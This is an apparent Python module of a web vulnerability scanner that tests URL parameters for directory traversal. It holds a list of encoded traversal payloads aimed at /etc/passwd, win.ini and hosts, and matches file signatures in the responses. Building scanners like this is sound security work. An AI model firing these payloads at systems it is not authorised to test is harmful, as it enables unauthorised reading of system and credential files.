"""目录遍历漏洞检测模块"""
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode

from .base import BaseVulnerabilityChecker, Vulnerability, Severity


# 目录遍历 payload
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "../../../windows/system32/drivers/etc/hosts",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "file:///etc/passwd",
    "file:///C:/windows/win.ini",
]

# 检测特征
LINUX_PASSWD_SIGNATURE = "root:x:0:0:"
WINDOWS_INI_SIGNATURE = "[extensions]"
WINDOWS_HOSTS_SIGNATURE = "127.0.0.1"


class DirectoryTraversalScanner(BaseVulnerabilityChecker):
    """目录遍历漏洞扫描器"""
    
    async def check(self, target: str, context: Dict) -> List[Vulnerability]:
        """执行目录遍历检测"""
        vulns = []
        urls = context.get("urls", [])
        session = context.get("session")
        
        if session is None:
            return vulns
        
        print("      检测目录遍历漏洞...")
        
        # 检测 URL 参数
        tested_params = set()
        for url in urls:
            parsed = urlparse(url)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            for param in params:
                param_key = f"{url}:{param}"
                if param_key in tested_params:
                    continue
                tested_params.add(param_key)
                
                for payload in TRAVERSAL_PAYLOADS:
                    result = await self._test_traversal(url, param, payload, session)
                    if result:
                        vulns.append(result)
                        break  # 找到一个就跳过其他 payload
        
        return vulns
    
    async def _test_traversal(self, url: str, param: str, payload: str, session) -> Vulnerability:
        """测试单个参数的目录遍历"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
        
        try:
            async with session.get(test_url, timeout=10, ssl=False) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    
                    # 检测 Linux /etc/passwd
                    if LINUX_PASSWD_SIGNATURE in text:
                        return Vulnerability(
                            name=f"目录遍历漏洞 (参数: {param})",
                            severity=Severity.CRITICAL,
                            url=test_url,
                            payload=payload,
                            description=f"参数 `{param}` 存在目录遍历漏洞，可读取 /etc/passwd",
                            remediation="对用户输入进行严格过滤，禁止 ../ 等路径遍历字符，使用白名单限制访问路径",
                            confidence=0.95,
                        )
                    
                    # 检测 Windows win.ini
                    if WINDOWS_INI_SIGNATURE in text:
                        return Vulnerability(
                            name=f"目录遍历漏洞 (参数: {param})",
                            severity=Severity.CRITICAL,
                            url=test_url,
                            payload=payload,
                            description=f"参数 `{param}` 存在目录遍历漏洞，可读取 Windows 系统文件",
                            remediation="对用户输入进行严格过滤，禁止 ..\\ 等路径遍历字符",
                            confidence=0.95,
                        )
                    
                    # 检测 hosts 文件
                    if text.count(WINDOWS_HOSTS_SIGNATURE) > 2 and "localhost" in text:
                        return Vulnerability(
                            name=f"目录遍历漏洞 (参数: {param})",
                            severity=Severity.HIGH,
                            url=test_url,
                            payload=payload,
                            description=f"参数 `{param}` 可能存在目录遍历漏洞",
                            remediation="对用户输入进行严格过滤，使用白名单限制访问路径",
                            confidence=0.8,
                        )
        except Exception:
            pass
        return None
